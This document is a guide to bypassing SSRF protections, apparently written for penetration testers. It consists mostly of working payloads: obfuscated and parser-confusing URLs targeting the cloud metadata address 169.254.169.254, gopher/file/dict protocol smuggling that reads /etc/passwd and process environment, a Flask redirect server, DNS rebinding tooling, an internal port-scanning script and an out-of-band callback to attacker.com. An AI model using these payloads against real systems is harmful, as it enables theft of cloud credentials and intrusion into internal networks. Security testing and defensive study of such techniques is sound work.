# SSRF Filter Bypass Techniques Guide

## Overview

Most applications implement URL validation to prevent SSRF. This guide covers techniques to bypass common filters including IP-based blocklists, URL parsers, protocol restrictions, and DNS-based protections.

---

## URL Parser Differentials

Different URL parsers interpret the same URL differently, creating bypass opportunities.

### Authority Confusion

```
http://attacker.com@169.254.169.254/
http://169.254.169.254#@attacker.com/
http://169.254.169.254%23@attacker.com/
```

### Fragment and Query Confusion

```
http://attacker.com/path#http://169.254.169.254/
http://attacker.com?next=http://169.254.169.254/
```

### Backslash vs Forward Slash

```
http://attacker.com\@169.254.169.254/
```

---

## IP Address Obfuscation

### Decimal Encoding

```
http://2852039166/           # 169.254.169.254 as decimal
http://0xA9.0xFE.0xA9.0xFE/ # Hex octets
http://0xA9FEA9FE/          # Full hex
http://0251.0376.0251.0376/ # Octal
```

### IPv6 Representations

```
http://[::ffff:169.254.169.254]/
http://[0:0:0:0:0:ffff:a9fe:a9fe]/
http://[::ffff:a9fe:a9fe]/
```

### Mixed Notation

```
http://169.254.169.254.xip.io/
http://169.254.169.254.nip.io/
http://[0:0:0:0:0:ffff:169.254.169.254]/
```

### Enclosed Alphanumerics

```
http://①⑥⑨.②⑤④.①⑥⑨.②⑤④/
```

---

## DNS Rebinding

### Basic DNS Rebinding Attack

```
1. Register domain with short TTL (e.g., 1 second)
2. First resolution → attacker IP (passes validation)
3. Application validates URL against allowlist
4. TTL expires before actual fetch
5. Second resolution → 169.254.169.254
6. Application fetches internal resource
```

### Tools

```bash
# Using rbndr.us (public DNS rebinding service)
# Format: <hex-ip1>.<hex-ip2>.rbndr.us
# Alternates between two IPs
http://7f000001.a9fea9fe.rbndr.us/

# Using Singularity of Origin
git clone https://github.com/nccgroup/singularity
cd singularity
go build -o singularity cmd/singularity-server/main.go
./singularity -HTTPServerPort 8080 -DNSRebindStrategy round-robin
```

### DNS Rebinding with Race Condition

```python
import threading
import requests

def race_fetch(url, results, idx):
    try:
        r = requests.get(url, timeout=5)
        results[idx] = r.text
    except:
        results[idx] = None

# Fire multiple requests during DNS TTL window
results = [None] * 10
threads = []
for i in range(10):
    t = threading.Thread(target=race_fetch, args=(target_url, results, i))
    threads.append(t)
    t.start()
```

---

## Protocol Smuggling

### Gopher Protocol

```
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0D%0AHost:%20169.254.169.254%0D%0A%0D%0A
```

### File Protocol

```
file:///etc/passwd
file:///proc/self/environ
file:///proc/net/if_inet6
```

### Dict Protocol

```
dict://169.254.169.254:80/
```

### TFTP Protocol

```
tftp://169.254.169.254/latest/meta-data/
```

---

## Redirect-Based Bypasses

### Open Redirect Chaining

```
https://target.com/redirect?url=http://169.254.169.254/
https://accounts.google.com/ServiceLogin?continue=http://169.254.169.254/
```

### 302/307 Redirect from Attacker Server

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/ssrf')
def ssrf_redirect():
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)

@app.route('/ssrf-post')
def ssrf_post_redirect():
    # 307 preserves HTTP method
    return redirect('http://169.254.169.254/latest/api/token', code=307)
```

### JavaScript-Based Redirect (for headless browsers)

```html
<html>
<script>
window.location = "http://169.254.169.254/latest/meta-data/";
</script>
</html>
```

---

## Allowlist Bypass Techniques

### Subdomain Matching Bypass

```
# If allowlist checks *.example.com
http://example.com.attacker.com/
http://example.com@attacker.com/
http://attacker.com/example.com
```

### URL Encoding

```
http://169.254.169.254/ → http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/
# Double encoding
http://%2531%2536%2539%252e%2532%2535%2534%252e%2531%2536%2539%252e%2532%2535%2534/
```

### Unicode Normalization

```
http://169。254。169。254/  (fullwidth period)
http://169．254．169．254/  (halfwidth period)
```

---

## Blind SSRF Exploitation

When response is not returned to the attacker:

### Time-Based Detection

```bash
# Compare response times
# Internal host (fast): http://target.com/fetch?url=http://127.0.0.1:80/
# Non-existent host (slow): http://target.com/fetch?url=http://192.168.1.99:80/
```

### Out-of-Band (OOB) Detection

```bash
# DNS-based
http://target.com/fetch?url=http://unique-id.burpcollaborator.net/
http://target.com/fetch?url=http://unique-id.oastify.com/

# HTTP-based callback
http://target.com/fetch?url=http://attacker.com/ssrf-callback?data=
```

### Port Scanning via SSRF

```python
import requests
import time

target = "https://vulnerable.com/api/fetch"
internal_host = "192.168.1.1"

for port in [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]:
    start = time.time()
    r = requests.get(target, params={"url": f"http://{internal_host}:{port}/"})
    elapsed = time.time() - start
    status = "OPEN" if elapsed < 2 else "CLOSED"
    print(f"Port {port}: {status} ({elapsed:.2f}s)")
```

---

## Testing Methodology

1. **Identify input vectors** — URL parameters, webhooks, file imports, API integrations
2. **Test basic SSRF** — `http://127.0.0.1`, `http://localhost`
3. **Test IP obfuscation** — Decimal, hex, octal, IPv6
4. **Test DNS rebinding** — Short TTL domains, rbndr.us
5. **Test protocol handlers** — gopher://, file://, dict://
6. **Test redirect chains** — 302/307 from attacker server
7. **Test parser differentials** — Authority confusion, encoding
8. **Verify blind SSRF** — OOB callbacks, timing analysis
